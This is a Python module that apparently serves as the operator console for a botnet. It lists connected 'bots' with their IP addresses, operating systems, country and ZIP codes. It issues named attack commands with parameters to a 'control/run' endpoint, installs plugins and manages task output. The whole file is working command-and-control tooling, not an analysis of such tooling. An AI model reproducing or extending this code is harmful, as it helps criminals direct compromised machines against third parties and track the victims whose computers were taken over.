#!/usr/bin/env python

from classes.rest import Rest

import time


class Operations:
    @staticmethod
    def list(host, port, alive=''):
        bot_list = []
        current = time.time()
        for bot in Rest.get(host, port, 'knight/list', alive):
            item = {'busy': bot['busy'], 'id': bot['id'], 'lastSeen': int(current - bot['lastSeen'] / 1000)}
            for key in bot['properties']: item[key] = bot['properties'][key];
            bot_list.append(item)
        return bot_list

    @staticmethod
    def sort(bot_list, key):
        return sorted(bot_list, key=lambda k: k[key])

    @staticmethod
    def print_list(bot_list):
        properties = ['id', 'busy', 'ipAddress', 'lastSeen', 'os', 'countryCode', 'zip']
        response = "ID BUSY ADDRESS LASTSEEN OS COUNTRY ZIP\n"
        for bot in bot_list:
            for key in properties:
                if key in bot: response += '\'' + str(bot[key]) + "\' "
                else: response += '\'\''
            response += "\n"
        return response

    @staticmethod
    def attack(host, port, attack, param):
        return Rest.post(host, port, 'control/run',
                         json={'command': attack, 'parameters': param},
                         headers={'content-type': 'application/json'})

    @staticmethod
    def hash_args(args):
        param = {}
        for element in args:
            if len(element.split(':')) < 2: return -1
            key = str(element.split(':')[0])
            value = str(':'.join(element.split(':')[1:]))
            param[key] = value
        return param

    @staticmethod
    def install(host, port, data):
        return Rest.post(host, port, 'control/plugin/install', data)

    @staticmethod
    def status(host, port, task_id):
        return Rest.get(host, port, 'control/check', task_id)

    @staticmethod
    def block(response):
        return not response['status'] == 'complete'

    @staticmethod
    def clear(host, port, task_id):
        return Rest.delete(host, port, 'control/delete', task_id)

    @staticmethod
    def output(host, port, task_id):
        return Rest.get(host, port, 'control/output', task_id)

    @staticmethod
    def task_list(host, port):
        return Rest.get(host, port, 'control/task/list')

    @staticmethod
    def plugin_list(host, port):
        return Rest.get(host, port, 'control/plugin/list')

    @staticmethod
    def plugin_help(host, port, plugin_id):
        return Rest.get(host, port, 'control/plugin/help', plugin_id)